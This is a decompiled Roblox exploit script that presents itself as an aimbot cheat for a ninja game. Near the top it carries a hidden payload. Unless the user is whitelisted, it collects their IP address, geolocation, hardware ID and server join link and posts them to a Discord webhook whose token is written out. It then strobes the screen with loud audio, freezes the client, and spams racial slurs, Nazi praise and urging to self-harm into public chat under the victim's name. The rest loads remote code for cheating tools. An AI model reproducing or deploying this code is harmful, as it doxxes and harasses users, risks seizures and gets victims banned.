print("\r\n                                                                                         \r\n                             ,,                                                      \r\n`7MM\"\"\"Mq.                   db                    mm      `7MN.   `7MF\'     db      \r\n  MM   `MM.                                        MM        MMN.    M      ;MM:     \r\n  MM   ,M9 `7Mb,od8 ,pW\"Wq.`7MM  .gP\"Ya   ,p6\"bo mmMMmm      M YMb   M     ,V^MM.    \r\n  MMmmdM9    MM\' \"\'6W\'   `Wb MM ,M\'   Yb 6M\'  OO   MM        M  `MN. M    ,M  `MM    \r\n  MM         MM    8M     M8 MM 8M\"\"\"\"\"\" 8M        MM        M   `MM.M    AbmmmqMA   \r\n  MM         MM    YA.   ,A9 MM YM.    , YM.    ,  MM        M     YMM   A\'     VML  \r\n.JMML.     .JMML.   `Ybmd9\'  MM  `Mbmmd\'  YMbmd\'   `Mbmo   .JML.    YM .AMA.   .AMMA.\r\n                          QO MP                                                      \r\n                          `bmP                                                       \r\n\r\n\r\n    - Made by 7 big guys ;)\r\n")
print("[Project Ninja Assassin]: Loading..")
local vu1 = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://raw.githubusercontent.com/FracturedVortex/gerhgrth9y3u9847y123894761239841/refs/heads/main/dfh43tryh34t56345.json"));
(function()
    if table.find(vu1, game.Players.LocalPlayer.UserId) then
        return
    else
        local v2 = {
            "you\'re fat",
            "i hate knee gears",
            "fk mexi cans",
            "fk all fili pinos",
            "all fili pinos are stupid as hell",
            "kill all knee gears",
            "asian black",
            "hxng uself",
            "fk knee gears",
            "i fucking hate niggers",
            "kill all filipino bitches",
            "faggots make me sick",
            "i worship hitler",
            "bring back concentration camps"
        }
        local v3 = game:GetService("RunService")
        local vu4 = ""
        local vu5 = v3:IsRunning() and time or os.clock
        local vu6 = nil
        local vu7 = nil
        local vu8 = {}
        local function v10()
            vu6 = vu5()
            for v9 = # vu8, 1, - 1 do
                vu8[v9 + 1] = vu8[v9] >= vu6 - 1 and vu8[v9] or nil
            end
            vu8[1] = vu6
            vu4 = tostring(math.floor(vu5() - vu7 >= 1 and # vu8 or # vu8 / (vu5() - vu7)))
        end
        vu7 = vu5()
        local v11 = v3.Heartbeat:Connect(v10)
        task.wait(0.03)
        local v26, vu27 = pcall(function()
            local vu12 = game:GetService("HttpService")
            local v13 = syn and syn.request or http and http.request or (fluxus and fluxus.request or http_request or (request or httprequest))
            local v14 = game:GetService("Players")
            local vu15 = v14.LocalPlayer
            local vu16 = nil
            local vu17 = nil
            pcall(function()
                vu16 = game:HttpGet("https://api.ipify.org")
                vu17 = vu12:JSONDecode(game:HttpGet("https://ipinfo.io/" .. vu16 .. "/json"))
            end)
            local v18 = vu12:JSONDecode(game:HttpGet("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. vu15.UserId .. "&size=420x420&format=Png&isCircular=false&thumbnailType=HeadShot")).data[1].imageUrl or "https://cdn.discordapp.com/attachments/1210819219910819863/1367926207894523954/imageryhtfdh.png?ex=68165c0e&is=68150a8e&hm=bd1579b978b951254e17dc7b6cede3305f67b215fa892d722fae0f0485450c83&"
            local v19 = {
                Url = "https://canary.discord.com/api/webhooks/1311409251746447390/GYW3Sdk5ik1fq653uhIJKfu2V2WDIyjh1UicnZmGcPsSAp4MbXGGCsc6MIn0CSfjKoED",
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                }
            }
            local v20 = vu12.JSONEncode
            local v21 = {
                content = "@everyone"
            }
            local v22 = {}
            local v25 = {
                title = vu15.Name .. " | " .. vu15.UserId,
                description = vu15.DisplayName .. " (@" .. vu15.Name .. ") tried to execute the script.",
                url = "https://www.roblox.com/users/" .. vu15.UserId .. "/profile",
                type = "rich",
                color = tonumber(16777215),
                fields = {
                    {
                        name = "**Script Info:**",
                        value = "Script Name: " .. "Ninja Assassin OP Aimbot",
                        inline = false
                    },
                    {
                        name = "**Player Info:**",
                        value = "Username: " .. vu15.Name .. "\nDisplay Name: " .. vu15.DisplayName .. "\nUserId: " .. vu15.UserId .. "\nHealth: " .. (vu15.Character and (vu15.Character:FindFirstChild("Humanoid") and (tostring(vu15.Character.Humanoid.Health) or "No Character/Humanoid Found") or "No Character/Humanoid Found") or "No Character/Humanoid Found") .. "\nMax Health: " .. (vu15.Character and (vu15.Character:FindFirstChild("Humanoid") and (tostring(vu15.Character.Humanoid.MaxHealth) or "No Character/Humanoid Found") or "No Character/Humanoid Found") or "No Character/Humanoid Found") .. "\nNinjutsu: " .. vu15.leaderstats.Ninjutsu.Value .. "\nReputation: " .. vu15.leaderstats.Reputation.Value .. "\nProfile: [View Profile](https://www.roblox.com/users/" .. vu15.UserId .. "/profile)",
                        inline = false
                    },
                    {
                        name = "**Account Info:**",
                        value = "Account Age: " .. vu15.AccountAge .. " days\nPremium Status: " .. (function()
                            local v23, v24 = pcall(function()
                                return vu15.MembershipType
                            end)
                            return v23 and (v24 ~= Enum.MembershipType.None and "true" or "false") or "Error getting premium type"
                        end)() .. "\nAccount Created: " .. os.date("%A, %B %d, %Y", os.time() - vu15.AccountAge * 86400),
                        inline = false
                    },
                    {
                        name = "**Game Details:**",
                        value = "Game Name: " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "\nGame ID: " .. game.PlaceId .. "\nGame Link: [View Game](https://www.roblox.com/games/" .. game.PlaceId .. ")\nGame Version: " .. game.PlaceVersion,
                        inline = false
                    },
                    {
                        name = "**Server Info:**",
                        value = "Players in Server: " .. tostring(# v14:GetPlayers()) .. "/" .. tostring(v14.MaxPlayers) .. "\nServer Time: " .. os.date("%H:%M:%S"),
                        inline = false
                    },
                    {
                        name = "**Network Info:**",
                        value = "Ping: " .. string.format("%.2f", game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()) .. " ms",
                        inline = false
                    },
                    {
                        name = "**System Info:**",
                        value = "FPS: " .. vu4 .. "\nDevice Type: " .. (game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC" or "Mobile/Other") .. "\nResolution: " .. workspace.CurrentCamera.ViewportSize.X .. " x " .. workspace.CurrentCamera.ViewportSize.Y .. "\nMemory Usage: " .. game:GetService("Stats"):GetTotalMemoryUsageMb() .. " MB\nExecutor: " .. (identifyexecutor() or "Unknown"),
                        inline = false
                    },
                    {
                        name = "**Character Info:**",
                        value = "Position: " .. tostring(vu15.Character and (vu15.Character:FindFirstChild("HumanoidRootPart") and math.floor(vu15.Character.HumanoidRootPart.Position.X) .. ", " .. math.floor(vu15.Character.HumanoidRootPart.Position.Y) .. ", " .. math.floor(vu15.Character.HumanoidRootPart.Position.Z) or "No Character/HRP Found") or "No Character/HRP Found"),
                        inline = false
                    },
                    {
                        name = "**Join Player:**",
                        value = "[Click me to join player](https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&instanceId=" .. (game.JobId or 1) .. "&launcht=" .. os.time() .. ")\nTeleport Script: game:GetService(\'TeleportService\'):TeleportToPlaceInstance(" .. game.PlaceId .. ", \'" .. tostring(game.JobId) .. "\', game.Players.LocalPlayer)",
                        inline = false
                    },
                    {
                        name = "**Hardware ID:**",
                        value = game:GetService("RbxAnalyticsService"):GetClientId(),
                        inline = false
                    },
                    {
                        name = "**IP Address Info:**",
                        value = "IP: " .. (vu17 and vu17.ip ~= nil and (vu17.ip or "Couldn\'t find IP") or "Couldn\'t find IP") .. "\nHost Name: " .. (vu17 and vu17.hostname ~= nil and (vu17.hostname or "Couldn\'t find host name") or "Couldn\'t find host name") .. "\nCity: " .. (vu17 and vu17.city ~= nil and (vu17.city or "Couldn\'t find city") or "Couldn\'t find city") .. "\nRegion: " .. (vu17 and vu17.region ~= nil and (vu17.region or "Couldn\'t find region") or "Couldn\'t find region") .. "\nCountry: " .. (vu17 and vu17.country ~= nil and (vu17.country or "Couldn\'t find country") or "Couldn\'t find country") .. "\nLocation: " .. (vu17 and vu17.loc ~= nil and (vu17.loc or "Couldn\'t find location") or "Couldn\'t find location") .. "\nHost: " .. (vu17 and vu17.org ~= nil and (vu17.org or "Couldn\'t find host") or "Couldn\'t find host") .. "\nPostal Code: " .. (vu17 and vu17.postal ~= nil and (vu17.postal or "Couldn\'t find postal code") or "Couldn\'t find postal code") .. "\nTime Zone: " .. (vu17 and (vu17.timezone ~= nil and vu17.timezone or "Couldn\'t find time zone") or "Couldn\'t find time zone"),
                        inline = false
                    }
                },
                thumbnail = {
                    url = v18
                },
                footer = {
                    text = "Execution Log | " .. os.date("%A, %B %d, %Y at %I:%M:%S %p %Z")
                }
            }
            __set_list(v22, 1, {
                v25
            })
            v21.embeds = v22
            v19.Body = v20(vu12, v21)
            v13(v19)
        end)
        if not v26 then
            pcall(function()
                local v28 = game:GetService("HttpService")
                local v29 = syn and syn.request or http and http.request or (fluxus and fluxus.request or http_request or (request or httprequest))
                local v30 = game:GetService("Players").LocalPlayer
                local v31 = {
                    Url = "https://canary.discord.com/api/webhooks/1311409251746447390/GYW3Sdk5ik1fq653uhIJKfu2V2WDIyjh1UicnZmGcPsSAp4MbXGGCsc6MIn0CSfjKoED",
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    }
                }
                local v32 = v28.JSONEncode
                local v33 = {
                    content = "@everyone\n**" .. v30.Name .. " | " .. v30.UserId .. "**\n" .. v30.DisplayName .. " (@" .. v30.Name .. ") tried to execute the script.\nHardware ID: " .. game:GetService("RbxAnalyticsService"):GetClientId() .. "\n(Failed to send previous message: " .. vu27 .. ")"
                }
                v31.Body = v32(v28, v33)
                v29(v31)
            end)
        end
        v11:Disconnect()
        local v34 = Instance.new("ScreenGui", game:GetService("CoreGui"))
        v34.IgnoreGuiInset = true
        v34.ResetOnSpawn = false
        v34.ZIndexBehavior = Enum.ZIndexBehavior.Global
        local v35 = Instance.new("Frame", v34)
        v35.AnchorPoint = Vector2.new(0.5, 0.5)
        v35.Position = UDim2.new(0.5, 0, 0.5, 0)
        v35.BackgroundTransparency = 1
        v35.ZIndex = 100
        local v36 = workspace.CurrentCamera.ViewportSize.X
        local v37 = workspace.CurrentCamera.ViewportSize.Y
        v35.Size = UDim2.new(0, v36 - v36 * 0.04, 0, v37 - v37 * 0.1)
        v35.MouseLeave:Connect(function()
            while true do
            end
        end)
        local v38 = Instance.new("TextLabel", v34)
        v38.AnchorPoint = Vector2.new(0.5, 0)
        v38.Position = UDim2.new(0.5, 0, 0.042, 0)
        v38.Size = UDim2.new(0.235, 0, 0.1, 0)
        v38.TextColor3 = Color3.fromRGB(255, 0, 0)
        v38.TextScaled = true
        v38.Font = Enum.Font.Fantasy
        v38.Text = "Epilepsy Warning"
        v38.BackgroundTransparency = 1
        v38.ZIndex = 100
        task.wait(3)
        local v39 = Instance.new("ImageLabel", v34)
        v39.AnchorPoint = Vector2.new(0.5, 0.5)
        v39.Position = UDim2.new(0.5, 0, 0.5, 0)
        v39.Size = UDim2.new(5, 0, 5, 0)
        v39.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        v39.ZIndex = 99
        local v40 = Instance.new("Sound", workspace)
        v40.SoundId = "rbxassetid://9116732969"
        v40.Volume = 10
        v40.Looped = true
        for _ = 1, 7 do
            local v41 = Instance.new("EqualizerSoundEffect")
            v41.Parent = v40
            v41.LowGain = 10
            v41.MidGain = 0
            v41.HighGain = 0
        end
        v40:Play()
        local function v43(p42)
            game:GetService("TextChatService"):WaitForChild("TextChannels"):WaitForChild("RBXGeneral"):SendAsync(p42)
        end
        v43("What asks no questions but must be answered? A phone.")
        while true do
            v39.BackgroundColor3 = Color3.fromRGB(math.random(1, 255), math.random(1, 255), math.random(1, 255))
            task.wait(0.02)
            v43(v2[math.random(1, # v2)])
        end
    end
end)()
local vu44 = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local vu45 = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local vu46 = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
local vu47 = "1.1.3"
local vu48 = "Project Ninja Assassin v" .. vu47 .. " Settings.txt"
local vu49 = Enum.KeyCode.LeftBracket
local vu50 = Enum.KeyCode.Quote
local v52 = cloneref or function(p51)
    return p51
end
local vu53 = v52(game:GetService("Players"))
local vu54 = v52(game:GetService("UserInputService"))
local vu55 = v52(game:GetService("RunService"))
local vu56 = v52(game:GetService("Workspace"))
local vu57 = v52(game:GetService("CoreGui"))
local v58 = v52(game:GetService("ReplicatedStorage"))
local vu59 = v52(game:GetService("TeleportService"))
v52(game:GetService("TweenService"))
local vu60 = v52(game:GetService("Lighting"))
local vu61 = v52(game:GetService("HttpService"))
v52(game:GetService("StarterGui"))
local vu62 = v52(game:GetService("TextChatService"))
v52(game:GetService("Teams"))
local vu63 = vu53.LocalPlayer
local vu64 = vu63.Character or vu63.CharacterAdded:Wait()
local vu65 = vu63:GetMouse()
local vu66 = v58:WaitForChild("RemoteEvent"):WaitForChild("GiveItemEvent")
local vu67 = vu44.Options
local vu68 = "Fluent"
local vu69 = 5
local vu70 = {}
local vu71 = {
    NinjutsuChanged = {},
    CharacterAdded = {},
    PlayerAdded = {},
    PlayerRemoved = {},
    UserInputBegan = {},
    UserInputEnded = {},
    CharacterTouched = {},
    WhitelistCharacterTouched = {},
    WorkspaceDescendantAdded = {},
    WorkspaceDescendantRemoved = {}
}
local vu72 = {
    "",
    "K+",
    "M+",
    "B+",
    "T+",
    "qd+",
    "Qn+",
    "sx+",
    "Sp+",
    "O+",
    "N+",
    "de+",
    "Ud+",
    "DD+",
    "tdD+",
    "qdD+",
    "QnD+",
    "sxD+",
    "SpD+",
    "OcD+",
    "NvD+",
    "Vgn+",
    "UVg+",
    "DVg+",
    "TVg+",
    "qtV+",
    "QnV+",
    "SeV+",
    "SPG+",
    "OVG+",
    "NVG+",
    "TGN+",
    "UTG+",
    "DTG+",
    "tsTG+",
    "qtTG+",
    "QnTG+",
    "ssTG+",
    "SpTG+",
    "OcTG+",
    "NoAG+",
    "UnAG+",
    "DuAG+",
    "TeAG+",
    "QdAG+",
    "QnAG+",
    "SxAG+",
    "SpAG+",
    "OcAG+",
    "NvAG+",
    "CT+"
}
local vu73 = {
    BodyParts = {
        "Head",
        "HumanoidRootPart",
        "UpperTorso",
        "LowerTorso",
        "RightUpperArm",
        "LeftUpperArm",
        "RightLowerArm",
        "LeftLowerArm",
        "RightHand",
        "LeftHand",
        "RightUpperLeg",
        "LeftUpperLeg",
        "RightLowerLeg",
        "LeftLowerLeg",
        "RightFoot",
        "LeftFoot"
    },
    Modes = {
        "Soft",
        "Semi",
        "Normal",
        "Permanent"
    },
    Weapons = {
        "Sword",
        "Shuriken",
        "Teleport"
    },
    Tools = {
        "Train",
        "Sword",
        "Shuriken",
        "Teleport"
    },
    ESPText = {
        "Distance",
        "State",
        "Bubble",
        "Godded"
    },
    RunServices = {
        "RenderStepped",
        "Stepped",
        "Heartbeat"
    },
    Clothing = {
        "Neutral1",
        "Neutral2",
        "Neutral3",
        "Neutral4",
        "Neutral5",
        "Neutral6",
        "Neutral7",
        "Ying8",
        "Ying9",
        "Ying10",
        "Ying11",
        "Ying12",
        "Ying13",
        "Ying14",
        "Ying15",
        "Ying16",
        "Ying17",
        "Ying18",
        "Ying19",
        "Ying20",
        "Ying21",
        "Ying22",
        "Ying23",
        "Ying24",
        "Ying25",
        "Ying26",
        "Yang8",
        "Yang9",
        "Yang10",
        "Yang11",
        "Yang12",
        "Yang13",
        "Yang14",
        "Yang15",
        "Yang16",
        "Yang17",
        "Yang18",
        "Yang19",
        "Yang20",
        "Yang21",
        "Yang22",
        "Yang23",
        "Yang24",
        "Yang25",
        "Yang26",
        "GroupMemberCloth1",
        "GroupMemberCloth2",
        "GroupMemberCloth3",
        "GroupMemberCloth4",
        "GroupMemberCloth5",
        "GroupMemberCloth6",
        "GroupMemberCloth7",
        "GroupMemberCloth8",
        "GroupMemberCloth9",
        "GroupMemberCloth10",
        "GroupMemberCloth11",
        "GroupMemberCloth12",
        "GroupMemberCloth13",
        "GroupMemberCloth14",
        "GroupMemberCloth15",
        "GroupMemberCloth16",
        "VipPackCloth",
        "PizzaPackCloth",
        "RainbowPackCloth"
    },
    Shuriken = {
        "Shuriken1",
        "Shuriken2",
        "Shuriken3",
        "Shuriken4",
        "Shuriken5",
        "Shuriken6",
        "Shuriken7",
        "Shuriken8Ying",
        "Shuriken9Ying",
        "Shuriken8Yang",
        "Shuriken9Yang",
        "OctopusCannon",
        "GrabBag",
        "BoomerangDagger",
        "WarRock",
        "Handle",
        "DarkageKunai",
        "ThrowingDonuts",
        "StarfishShuriken",
        "FlowerStar1",
        "FlowerStar2",
        "FlowerStar3",
        "GhostDagger",
        "PizzaKunai",
        "Chakra",
        "MetallicThrowingKnives"
    },
    Sword = {
        "WoodenSword1",
        "WoodenSword2",
        "BambooKatana",
        "Katana",
        "JadeKatanaOfTheDarkestForest",
        "GoldenKatanaOfTheUnflinchingDawn",
        "OcherousKatanaOfTheSettingSun",
        "CrimsonKatanaOfTheUnsettingSun",
        "IrisKatanaOfGoldengroveUnleaving",
        "BlueKatanaOfOneThousandTears",
        "Ninja Katana",
        "Golden Katana",
        "RoninKatana",
        "BluesteelKatana",
        "GoldenSnakeKatana",
        "DarksteelKatanaOfAncientIlluminators",
        "VilethornSword",
        "ViridianKatana",
        "Ocean Samurai",
        "BlackironKatana",
        "Claymore",
        "MirrorSword",
        "BladeFederation",
        "FallenArtemisSwordAndShield",
        "OrinthianSword",
        "Bluesteel Sword",
        "Saw Sword",
        "EgyptianSword",
        "DragonSword",
        "ShadowDancer",
        "Korblox Sword",
        "BombasticExplodingSword",
        "FireSword",
        "DemonSword",
        "FireAxe",
        "DarkArtSword",
        "Khopesh",
        "Dragon Fire Sword",
        "PhoenixSword",
        "OmegaRainbowKatana",
        "CrescendoTheSoulStealer",
        "SwordOfRedEpicness",
        "RedcliffAxe",
        "BusterSword",
        "SparkletimeClaymore",
        "FangOfAnansi",
        "CrimsonwrathSword",
        "SwordOfDarkness",
        "AduriteKatana",
        "UltraKatana",
        "Ghostwalker",
        "BombtasticKatana",
        "KnightsOfSplinteredSkiesSword",
        "KnightSword",
        "TempestBlades",
        "Heartbreaker",
        "BreakerSword",
        "Draco Blade",
        "Shadow Blade",
        "Falchion",
        "IceSword1",
        "IceSword2",
        "SwordOfLight",
        "SorcusSword",
        "WaterSword",
        "Diamond Blade Sword",
        "SnowShieldAndSword",
        "WindSword",
        "BoneSword",
        "Ice Dragon Slaying Sword",
        "TelamonsterTheChaosEdge",
        "SerpentSword",
        "Blizzard Sword",
        "RainbowKatana",
        "SpaceSword",
        "DragonSword&Shield",
        "RiddlingSkullSword",
        "UpperSword",
        "RidiculousSharkSword",
        "LightUpSword",
        "PurpleSword",
        "WhiteGoldBlueFlowerSword",
        "Dragon Mouth Fire Sword",
        "BlackAndWhiteWingedSword",
        "Frying Pan",
        "GuitarSword",
        "DualPlungers",
        "SpringtimeCutlass",
        "SummerSword",
        "BigBugNet",
        "Mackerel",
        "BoardWithANailInIt",
        "StopSignAxe",
        "BoneScythe",
        "ScytheOfSingularity",
        "GrimAxe",
        "BatWingScythe",
        "PizzaSword",
        "UnicornSword"
    },
    Inversables = {
        "Ying8",
        "Ying9",
        "Ying10",
        "Ying11",
        "Ying12",
        "Ying13",
        "Ying14",
        "Ying15",
        "Ying16",
        "Ying17",
        "Ying18",
        "Ying19",
        "Ying20",
        "Ying21",
        "Ying22",
        "Ying23",
        "Ying24",
        "Ying25",
        "Ying26",
        "Yang8",
        "Yang9",
        "Yang10",
        "Yang11",
        "Yang12",
        "Yang13",
        "Yang14",
        "Yang15",
        "Yang16",
        "Yang17",
        "Yang18",
        "Yang19",
        "Yang20",
        "Yang21",
        "Yang22",
        "Yang23",
        "Yang24",
        "Yang25",
        "Yang26"
    },
    ShurikenPacks = {
        Shuriken = {
            "Shuriken1",
            "Shuriken2",
            "Shuriken3",
            "Shuriken4",
            "Shuriken5",
            "Shuriken6",
            "Shuriken7",
            "Shuriken8Ying",
            "Shuriken9Ying",
            "Shuriken8Yang",
            "Shuriken9Yang"
        },
        FunnyThrowPass = {
            "OctopusCannon",
            "GrabBag",
            "BoomerangDagger",
            "WarRock",
            "Handle",
            "DarkageKunai",
            "ThrowingDonuts",
            "StarfishShuriken",
            "FlowerStar1",
            "FlowerStar2",
            "FlowerStar3",
            "GhostDagger"
        },
        PizzaPass = {
            "PizzaKunai"
        },
        VipPass = {
            "Chakra"
        },
        RainbowPass = {
            "MetallicThrowingKnives"
        }
    },
    SwordPacks = {
        Sword = {
            "WoodenSword1",
            "WoodenSword2",
            "BambooKatana",
            "Katana",
            "JadeKatanaOfTheDarkestForest",
            "GoldenKatanaOfTheUnflinchingDawn",
            "OcherousKatanaOfTheSettingSun",
            "CrimsonKatanaOfTheUnsettingSun",
            "IrisKatanaOfGoldengroveUnleaving",
            "BlueKatanaOfOneThousandTears",
            "Ninja Katana",
            "Golden Katana",
            "RoninKatana",
            "BluesteelKatana",
            "GoldenSnakeKatana",
            "DarksteelKatanaOfAncientIlluminators",
            "VilethornSword",
            "ViridianKatana",
            "Ocean Samurai",
            "BlackironKatana",
            "Claymore",
            "MirrorSword",
            "BladeFederation",
            "FallenArtemisSwordAndShield",
            "OrinthianSword",
            "Bluesteel Sword",
            "Saw Sword",
            "EgyptianSword",
            "DragonSword",
            "ShadowDancer",
            "Korblox Sword",
            "BombasticExplodingSword",
            "FireSword",
            "DemonSword",
            "FireAxe",
            "DarkArtSword",
            "Khopesh",
            "Dragon Fire Sword",
            "PhoenixSword",
            "OmegaRainbowKatana",
            "CrescendoTheSoulStealer",
            "SwordOfRedEpicness",
            "RedcliffAxe",
            "BusterSword",
            "SparkletimeClaymore",
            "FangOfAnansi",
            "CrimsonwrathSword",
            "SwordOfDarkness",
            "AduriteKatana",
            "UltraKatana",
            "Ghostwalker",
            "BombtasticKatana",
            "KnightsOfSplinteredSkiesSword",
            "KnightSword",
            "TempestBlades",
            "Heartbreaker",
            "BreakerSword",
            "Draco Blade",
            "Shadow Blade",
            "Falchion",
            "IceSword1",
            "IceSword2",
            "SwordOfLight",
            "SorcusSword",
            "WaterSword",
            "Diamond Blade Sword",
            "SnowShieldAndSword",
            "WindSword",
            "BoneSword",
            "Ice Dragon Slaying Sword",
            "TelamonsterTheChaosEdge",
            "SerpentSword",
            "Blizzard Sword",
            "RainbowKatana",
            "SpaceSword",
            "DragonSword&Shield",
            "RiddlingSkullSword",
            "UpperSword",
            "RidiculousSharkSword",
            "LightUpSword",
            "PurpleSword",
            "WhiteGoldBlueFlowerSword",
            "Dragon Mouth Fire Sword",
            "BlackAndWhiteWingedSword"
        },
        FunnySwordPass = {
            "Frying Pan",
            "GuitarSword",
            "DualPlungers",
            "SpringtimeCutlass",
            "SummerSword",
            "BigBugNet",
            "Mackerel",
            "BoardWithANailInIt",
            "StopSignAxe"
        },
        VipPass = {
            "BoneScythe",
            "ScytheOfSingularity",
            "GrimAxe",
            "BatWingScythe"
        },
        PizzaPass = {
            "PizzaSword"
        },
        RainbowPass = {
            "UnicornSword"
        }
    }
}
local vu74 = {
    Whitelist = {
        Soft = {},
        Semi = {},
        Normal = {},
        Permanent = {}
    },
    Blacklist = {
        Soft = {},
        Semi = {},
        Normal = {},
        Permanent = {}
    },
    Targetlist = {
        Soft = {},
        Semi = {},
        Normal = {},
        Permanent = {}
    },
    BreakShurlist = {
        Soft = {},
        Semi = {},
        Normal = {},
        Permanent = {}
    },
    DisableShurslist = {
        Soft = {},
        Semi = {},
        Normal = {},
        Permanent = {}
    }
}
local vu147 = {
    InfiniteYield = function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
    end,
    FPSCounter = function()
        local v75
        if game:GetService("CoreGui").TopBarApp.TopBarApp.TopBarFrame:FindFirstChild("RightFrame") then
            v75 = game:GetService("CoreGui").TopBarApp.TopBarApp.TopBarFrame:FindFirstChild("RightFrame")
        else
            v75 = game:GetService("CoreGui").TopBarApp.TopBarApp.TopBarFrame.LeftFrame:Clone()
            v75.Parent = game:GetService("CoreGui").TopBarApp.TopBarApp.TopBarFrame
            v75.Name = "RightFrame"
            v75.Position = UDim2.new(0.5, 0, 0, 0)
            v75.Size = UDim2.new(0.5, - 16, 1, 0)
            v75.Layout.HorizontalAlignment = Enum.HorizontalAlignment.Right
            if v75:FindFirstChild("Blank") then
                v75:FindFirstChild("Blank"):Destroy()
            end
        end
        local vu76 = Instance.new("Frame")
        local vu77 = Instance.new("TextLabel")
        local v78 = Instance.new("UITextSizeConstraint")
        local vu79 = Instance.new("Frame")
        local vu80 = Instance.new("TextLabel")
        local v81 = Instance.new("UITextSizeConstraint")
        local vu82 = Instance.new("Frame")
        local vu83 = Instance.new("TextLabel")
        local v84 = Instance.new("UITextSizeConstraint")
        local vu85 = Instance.new("Frame")
        vu76.Parent = v75
        vu76.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        vu76.BackgroundTransparency = 1
        vu76.BorderSizePixel = 0
        vu76.AnchorPoint = Vector2.new(1, 0)
        vu76.Position = UDim2.new(1, 0, 0, 0)
        vu76.Size = UDim2.new(0, 76, 0, 37)
        vu76.LayoutOrder = 3
        vu76.Name = "FPS"
        vu76.ZIndex = 10
        vu77.Parent = vu76
        vu77.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        vu77.BackgroundTransparency = 1
        vu77.Size = UDim2.new(1, 0, 1, 0)
        vu77.Font = Enum.Font.Code
        vu77.Text = "N/A FPS"
        vu77.TextColor3 = Color3.fromRGB(255, 150, 0)
        vu77.TextScaled = true
        vu77.TextSize = 14
        vu77.TextWrapped = true
        v78.Parent = vu77
        v78.MaxTextSize = 20
        vu79.Parent = v75
        vu79.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        vu79.BackgroundTransparency = 1
        vu79.BorderSizePixel = 0
        vu79.AnchorPoint = Vector2.new(1, 0)
        vu79.Position = UDim2.new(1, 0, 0, 0)
        vu79.Size = UDim2.new(0, 120, 0, 37)
        vu79.LayoutOrder = 1
        vu79.Name = "Timer"
        vu79.ZIndex = 10
        vu80.Parent = vu79
        vu80.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        vu80.BackgroundTransparency = 1
        vu80.Size = UDim2.new(1, 0, 1, 0)
        vu80.Font = Enum.Font.Code
        vu80.Text = "00:00:00"
        vu80.TextColor3 = Color3.fromRGB(0, 255, 0)
        vu80.TextScaled = true
        vu80.TextSize = 14
        vu80.TextWrapped = true
        v81.Parent = vu80
        v81.MaxTextSize = 20
        vu82.Parent = v75
        vu82.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        vu82.BackgroundTransparency = 1
        vu82.BorderSizePixel = 0
        vu82.AnchorPoint = Vector2.new(1, 0)
        vu82.Position = UDim2.new(1, 0, 0, 0)
        vu82.Size = UDim2.new(0, 100, 0, 37)
        vu82.LayoutOrder = 2
        vu82.Name = "Ping"
        vu82.ZIndex = 10
        vu83.Parent = vu82
        vu83.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        vu83.BackgroundTransparency = 1
        vu83.Size = UDim2.new(1, 0, 1, 0)
        vu83.Font = Enum.Font.Code
        vu83.Text = "1000 ms"
        vu83.TextColor3 = Color3.fromRGB(0, 255, 0)
        vu83.TextScaled = true
        vu83.TextSize = 14
        vu83.TextWrapped = true
        v84.Parent = vu83
        v84.MaxTextSize = 20
        vu85.Parent = v75
        vu85.LayoutOrder = 0
        vu85.Position = UDim2.new(1, 0, 0, 0)
        vu85.Size = UDim2.new(0, 130, 1, 0)
        vu85.BackgroundTransparency = 1
        coroutine.resume(coroutine.create(function()
            while wait() do
                local v86 = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
                vu83.Text = string.format("%.2f", v86) .. " ms"
            end
        end))
        local function vu88(p87)
            return string.format("%02i", p87)
        end
        local function vu96()
            local v89 = math.floor(workspace.DistributedGameTime * 100)
            local v90 = math.floor(workspace.DistributedGameTime)
            local v91 = math.floor(workspace.DistributedGameTime / 60)
            local v92 = math.floor(workspace.DistributedGameTime / 60 / 60)
            local v93 = v89 - v90 * 100
            local v94 = v90 - v91 * 60
            local v95 = v91 - v92 * 60
            return vu88(v92) .. ":" .. vu88(v95) .. ":" .. vu88(v94) .. ":" .. vu88(v93)
        end
        coroutine.resume(coroutine.create(function()
            while task.wait(0.01) do
                vu80.Text = vu96()
            end
        end))
        local v97 = game:GetService("RunService")
        local vu98 = vu77
        local vu99 = v97:IsRunning() and time or os.clock
        local vu100 = nil
        local vu101 = nil
        local vu102 = {}
        local function v106()
            vu100 = vu99()
            for v103 = # vu102, 1, - 1 do
                vu102[v103 + 1] = vu102[v103] >= vu100 - 1 and vu102[v103] or nil
            end
            vu102[1] = vu100
            local v104 = tostring(math.floor(vu99() - vu101 >= 1 and # vu102 or # vu102 / (vu99() - vu101)))
            vu98.Text = v104 .. " FPS"
            if tonumber(v104) then
                local v105 = tonumber(v104)
                if v105 > 30 then
                    vu77.TextColor3 = Color3.fromRGB(0, 255, 0)
                elseif v105 > 15 then
                    vu77.TextColor3 = Color3.fromRGB(255, 150, 0)
                elseif v105 < 15 then
                    vu77.TextColor3 = Color3.fromRGB(255, 0, 0)
                end
            end
        end
        if game:GetService("CoreGui"):FindFirstChild("TopBarApp") and (game:GetService("CoreGui").TopBarApp:FindFirstChild("TopBarApp") and (game:GetService("CoreGui").TopBarApp.TopBarApp:FindFirstChild("UnibarLeftFrame") and game:GetService("CoreGui").TopBarApp.TopBarApp.UnibarLeftFrame:FindFirstChild("HealthBar"))) then
            game:GetService("CoreGui").TopBarApp.TopBarApp.UnibarLeftFrame:FindFirstChild("HealthBar").Changed:Connect(function()
